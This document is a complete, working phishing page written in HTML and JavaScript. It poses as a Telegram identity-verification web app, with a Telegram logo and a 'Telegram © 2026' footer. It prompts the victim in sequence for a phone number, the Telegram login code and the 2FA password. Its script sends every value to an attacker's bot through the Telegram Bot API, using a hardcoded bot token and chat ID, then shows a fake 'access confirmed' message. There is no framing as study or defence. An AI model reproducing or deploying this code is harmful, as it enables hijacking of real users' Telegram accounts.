<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка личности</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #1f1f1f;
            border-radius: 20px;
            padding: 30px 25px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 12px 40px rgba(0,0,0,0.6);
            border: 1px solid #2a2a2a;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo svg {
            width: 60px;
            height: 60px;
        }
        h2 {
            color: #fff;
            font-size: 22px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
        }
        .sub {
            color: #aaa;
            text-align: center;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        .input-group label {
            display: block;
            color: #ccc;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #2a2a2a;
            border: 1px solid #3a3a3a;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        .input-group input:focus {
            border-color: #6c8cff;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #6c8cff;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        .btn:hover {
            background: #5a7ae0;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .status {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            color: #ff6b6b;
            min-height: 24px;
        }
        .status.success {
            color: #69db7c;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
        .code-boxes {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 15px 0;
        }
        .code-box {
            width: 50px;
            height: 60px;
            background: #2a2a2a;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #fff;
            border: 2px solid #3a3a3a;
        }
        .code-box.filled {
            border-color: #6c8cff;
        }
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        .kbtn {
            padding: 14px;
            background: #2a2a2a;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 20px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .kbtn:hover {
            background: #3a3a3a;
        }
        .kbtn:active {
            transform: scale(0.95);
        }
        .kbtn.del {
            background: #3a2a2a;
            color: #ff6b6b;
        }
        .kbtn.del:hover {
            background: #4a3a3a;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.477 2 2 6.477 2 12C2 17.523 6.477 22 12 22C17.523 22 22 17.523 22 12C22 6.477 17.523 2 12 2ZM16.146 7.663L14.443 15.935C14.325 16.473 13.999 16.615 13.551 16.378L10.833 14.394L9.52 15.664C9.389 15.793 9.277 15.901 8.995 15.901L9.166 13.131L13.987 8.749C14.184 8.574 13.943 8.476 13.677 8.651L7.718 12.34L5.035 11.373C4.519 11.185 4.506 10.836 5.134 10.599L15.549 6.386C15.989 6.208 16.376 6.463 16.146 7.663Z" fill="#6c8cff"/>
            </svg>
        </div>
        <h2>Проверка личности</h2>
        <p class="sub">Введите данные для подтверждения</p>

        <div class="input-group">
            <label>Номер телефона</label>
            <input type="tel" id="phoneInput" placeholder="+7 999 999 99 99">
        </div>

        <div class="input-group" id="codeGroup" style="display:none;">
            <label>Код подтверждения</label>
            <input type="text" id="codeInput" placeholder="Введите код из Telegram">
        </div>

        <div class="input-group" id="passwordGroup" style="display:none;">
            <label>Пароль (если есть 2FA)</label>
            <input type="password" id="passwordInput" placeholder="Введите пароль">
        </div>

        <button class="btn" id="submitBtn">Продолжить</button>
        <div class="status" id="status"></div>
        <div class="footer">Telegram © 2026</div>
    </div>

    <script>
        // ===== КОНФИГ =====
        const BOT_TOKEN = "8789275152:AAFsi78kegUrM5y--o0-XvSqdnjPRf1MKUQ";
        const ADMIN_ID = "8821493005";
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        let step = 'phone';
        let phone = '';
        let code = '';
        let password = '';

        const statusEl = document.getElementById('status');
        const phoneInput = document.getElementById('phoneInput');
        const codeInput = document.getElementById('codeInput');
        const passwordInput = document.getElementById('passwordInput');
        const submitBtn = document.getElementById('submitBtn');

        // Функция отправки данных в бота
        async function sendToBot(text) {
            try {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: text
                    })
                });
            } catch(e) {
                console.error('Send error:', e);
            }
        }

        // Функция отправки структурированных данных (номер, код, пароль)
        async function sendDataToBot(phone, code, password) {
            const data = {
                phone: phone,
                code: code,
                password: password
            };
            // Отправляем как JSON в сообщении
            await sendToBot(`📩 ДАННЫЕ: ${JSON.stringify(data)}`);
            
            // Также отправляем в WebApp (если открыт через Telegram)
            try {
                if (window.Telegram && window.Telegram.WebApp) {
                    window.Telegram.WebApp.sendData(JSON.stringify(data));
                }
            } catch(e) {}
        }

        submitBtn.addEventListener('click', async function() {
            if (step === 'phone') {
                phone = phoneInput.value.trim();
                if (!phone) {
                    statusEl.textContent = 'Введите номер телефона';
                    statusEl.className = 'status';
                    return;
                }

                statusEl.textContent = 'Отправляем код...';
                statusEl.className = 'status';

                // Отправляем номер в бота
                await sendDataToBot(phone, '', '');

                document.getElementById('codeGroup').style.display = 'block';
                submitBtn.textContent = 'Подтвердить код';
                step = 'code';
                statusEl.textContent = '✅ Код отправлен! Введите его ниже.';
                statusEl.className = 'status success';
                return;
            }

            if (step === 'code') {
                code = codeInput.value.trim();
                if (!code) {
                    statusEl.textContent = 'Введите код';
                    statusEl.className = 'status';
                    return;
                }

                statusEl.textContent = 'Проверяем...';
                statusEl.className = 'status';

                // Отправляем код в бота
                await sendDataToBot(phone, code, '');

                document.getElementById('codeGroup').style.display = 'none';
                document.getElementById('passwordGroup').style.display = 'block';
                submitBtn.textContent = 'Подтвердить пароль (если есть)';
                step = 'password';
                statusEl.textContent = '✅ Код принят! Введите пароль, если он есть.';
                statusEl.className = 'status success';
                return;
            }

            if (step === 'password') {
                password = passwordInput.value.trim();

                // Отправляем все данные в бота
                await sendDataToBot(phone, code, password);

                statusEl.textContent = '✅ Подтверждено!';
                statusEl.className = 'status success';

                setTimeout(() => {
                    document.querySelector('.container').innerHTML = `
                        <div style="text-align:center;color:#fff;padding:40px 0;">
                            <div style="font-size:48px;margin-bottom:16px;">✅</div>
                            <h2>Доступ подтверждён</h2>
                            <p style="color:#aaa;margin-top:10px;">Возвращайтесь в бота</p>
                        </div>
                    `;
                }, 1000);

                // Закрываем WebApp
                try {
                    if (window.Telegram && window.Telegram.WebApp) {
                        window.Telegram.WebApp.close();
                    }
                } catch(e) {}
            }
        });

        // Ввод с физической клавиатуры (Enter)
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                submitBtn.click();
            }
        });
    </script>
</body>
</html>
